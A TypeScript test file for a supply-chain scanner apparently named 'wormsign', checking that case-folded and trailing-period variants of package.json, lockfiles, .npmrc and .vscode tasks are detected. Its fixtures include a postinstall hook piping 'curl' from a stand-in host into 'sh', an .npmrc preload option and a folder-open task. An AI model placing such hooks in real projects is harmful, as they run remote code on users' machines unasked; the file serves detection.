// A case-insensitive disk (APFS on macOS, NTFS on Windows) opens PACKAGE.JSON as package.json, and npm 10.9.2 there
// installs from it and runs its scripts. scan and soak must classify files by the folded name, as diff does, and a
// directory holding two names that fold alike is a finding: a checkout on such a disk keeps only one of them.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scanDirectory } from "../src/scan.js";
import { fx, testCtx } from "./helpers.js";
import { cli, tempTree } from "./validation-helpers.js";

const TEST_IOCS = ["--iocs", fx("iocs")];
const home = (): Record<string, string> => ({ HOME: mkdtempSync(join(tmpdir(), "wormsign-home-")) });
const summary = (fs: { ruleId: string; severity: string; file?: string }[]) => fs.map((f) => `${f.ruleId} ${f.severity} ${f.file ?? ""}`).sort();

/** FULLWIDTH LATIN SMALL LETTER P: NFKC folds it to "p", and no file system merges the two, so both names coexist on any disk. */
const FW_P = "ｐ";

test("scan: PACKAGE.JSON and PACKAGE-LOCK.JSON are read as the package.json and package-lock.json npm reads on macOS", async () => {
  const r = await cli(["scan", fx("casefold"), ...TEST_IOCS]);
  assert.deepEqual(summary(r.findings), ["WS-LC-001 medium PACKAGE.JSON", "WS-LK-001 critical PACKAGE-LOCK.JSON"]);
  assert.equal(r.code, 1);
  assert.ok(!r.notes.some((n) => n.startsWith("no npm, pnpm or yarn lockfile")), "the lockfile counts as one");
});

test("soak: PACKAGE-LOCK.JSON is read, so its versions are checked and its manifest counts as locked", async () => {
  const config = await cli(["soak", fx("casefold"), "--config-only"], { env: home() });
  assert.ok(!config.notes.some((n) => n.startsWith("no lockfile")), config.notes.join("\n"));
  assert.ok(config.findings.some((f) => f.ruleId === "WS-SK-003"), "an npm lockfile was found, so npm's release-age setting is checked");
  // A registry that knows no package: the one locked version fails closed, which proves it was read from the file.
  const none = (async () => new Response("{}", { status: 404 })) as typeof fetch;
  const full = await cli(["soak", fx("casefold"), "--no-osv"], { env: home(), fetchImpl: none });
  const sk2 = full.findings.filter((f) => f.ruleId === "WS-SK-002");
  assert.ok(
    sk2.some((f) => f.file === "PACKAGE-LOCK.JSON" && f.message.includes("wormsign-test-marker")),
    summary(full.findings).join("\n"),
  );
  assert.ok(!full.findings.some((f) => f.message.includes("no lockfile in its directory")), "the case-variant manifest is covered by the case-variant lockfile");
});

test("scan: a symlinked PACKAGE.JSON is reported as not checked, like a symlinked package.json", () => {
  const d = tempTree({ "real.json": "{}" });
  symlinkSync("real.json", join(d, "PACKAGE.JSON"));
  const r = scanDirectory(d, testCtx(), { nodeModules: false });
  assert.deepEqual(summary(r.findings), ["WS-SC-900 high PACKAGE.JSON"]);
});

test("scan: two manifests whose names fold alike are each a high finding naming the other", () => {
  const lock = JSON.stringify({ lockfileVersion: 3, packages: { "": {} } });
  const d = tempTree({ "package.json": "{}", [`${FW_P}ackage.json`]: "{}", "sub/package-lock.json": lock, [`sub/${FW_P}ackage-lock.json`]: lock, "README.md": "x", "readme.md.txt": "x" });
  const r = scanDirectory(d, testCtx(), { nodeModules: false });
  const clash = r.findings.filter((f) => f.ruleId === "WS-SC-900" && f.message.includes("same name in another case"));
  assert.deepEqual(clash.map((f) => `${f.severity} ${f.file}`).sort(), ["high package.json", "high sub/package-lock.json", `high sub/${FW_P}ackage-lock.json`, `high ${FW_P}ackage.json`]);
  assert.ok(clash.find((f) => f.file === "package.json")?.message.includes(`${FW_P}ackage.json`));
  // A few of the other names are listed, not all, so n names cannot make a report of n * n.
  const many = ["package.json", ...[0, 1, 2, 3, 4].map((i) => `${"package".slice(0, i)}${String.fromCharCode("package".charCodeAt(i) + 0xfee0)}${"package".slice(i + 1)}.json`)];
  const six = scanDirectory(tempTree(Object.fromEntries(many.map((n) => [n, "{}"]))), testCtx(), { nodeModules: false }).findings.filter((f) => f.ruleId === "WS-SC-900");
  assert.equal(six.length, 6);
  for (const f of six) assert.match(f.message, /^\S+ was not checked: \S+, \S+, \S+ and 2 more have the same name in another case/);
  // Files that decide nothing are not compared, and one name alone is no clash.
  assert.deepEqual(scanDirectory(tempTree({ "package.json": "{}", "a/package.json": "{}" }), testCtx(), { nodeModules: false }).findings.filter((f) => f.ruleId === "WS-SC-900"), []);
});

test("soak: two lockfiles whose names fold alike in one directory fail closed", async () => {
  const lock = JSON.stringify({ lockfileVersion: 3, packages: { "": {} } });
  const r = await cli(["soak", tempTree({ "package-lock.json": lock, [`${FW_P}ackage-lock.json`]: lock }), "--config-only"], { env: home() });
  const clash = r.findings.filter((f) => f.ruleId === "WS-SK-002" && f.message.includes("same name in another case"));
  // The second in listing order is reported, naming the first.
  assert.equal(clash.length, 1, JSON.stringify(r.findings));
  assert.equal(clash[0]?.severity, "high");
  assert.ok([`${FW_P}ackage-lock.json`, "package-lock.json"].includes(clash[0]?.file ?? ""));
});

/* ---- Windows drops trailing periods and spaces from a name ---- */

const POSTINSTALL = JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });

test("scan: package.json. and .npmrc. are read as the package.json and .npmrc a Windows checkout makes of them", async () => {
  const d = tempTree({ "package.json.": POSTINSTALL, ".npmrc.": "node-options=--require ./preload.js\n", ".vscode./tasks.json": JSON.stringify({ version: "2.0.0", tasks: [{ label: "s", type: "shell", command: "node x.js", runOptions: { runOn: "folderOpen" } }] }) });
  const r = await cli(["scan", d, "--no-baseline", ...TEST_IOCS]);
  const s = summary(r.findings);
  assert.ok(s.includes("WS-LC-002 high package.json."), s.join("\n"));
  assert.ok(s.some((x) => x.startsWith("WS-LC-004 ") && x.endsWith(" .npmrc.")), s.join("\n"));
  assert.ok(s.includes("WS-PS-001 high .vscode./tasks.json"), s.join("\n"));
  assert.equal(r.code, 1);
  // Beside a real package.json, the two names are one file on Windows: which one an install reads is not known.
  const both = tempTree({ "package.json": '{"name":"x","version":"1.0.0"}', "package.json ": POSTINSTALL, "package-lock.json": '{"lockfileVersion":3,"packages":{"":{}}}' });
  const b = summary((await cli(["scan", both, "--no-baseline", ...TEST_IOCS])).findings);
  assert.ok(b.includes("WS-SC-900 high package.json") && b.includes("WS-SC-900 high package.json "), b.join("\n"));
});

test("diff: a commit that adds package.json. with an install script is gated like package.json", async () => {
  const { gitRepo } = await import("./validation-helpers.js");
  const { writeFileSync } = await import("node:fs");
  const repo = gitRepo([(d) => writeFileSync(join(d, "README.md"), "x\n"), (d) => writeFileSync(join(d, "package.json."), POSTINSTALL)]);
  const r = await cli(["diff", "HEAD~1", "HEAD", "--dir", repo, "--no-baseline", ...TEST_IOCS]);
  assert.equal(r.code, 1, summary(r.findings).join("\n"));
  assert.ok(summary(r.findings).some((x) => x.startsWith("WS-LC-002 high package.json.")), summary(r.findings).join("\n"));
});
